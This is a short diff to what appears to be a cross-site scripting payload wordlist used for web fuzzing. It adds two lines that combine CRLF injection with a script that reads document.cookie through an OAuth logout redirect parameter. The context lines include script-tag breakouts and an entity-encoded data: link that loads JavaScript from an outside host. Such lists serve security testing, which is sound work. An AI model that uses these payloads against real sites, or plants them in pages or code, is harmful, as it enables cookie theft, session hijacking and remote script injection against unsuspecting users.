@@ -692,3 +692,5 @@ http://www.<script>alert(1)</script .com
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
 /?xss=\"</script><script>alert(\"XSS\")</script>" -mr "<script>alert(\"XSS\")</script>
 </script><script>alert(\"XSS\")</script>" -mr "<script>alert(\"XSS\")</script>
+oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.cookie)</script>
+/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.cookie)</script>
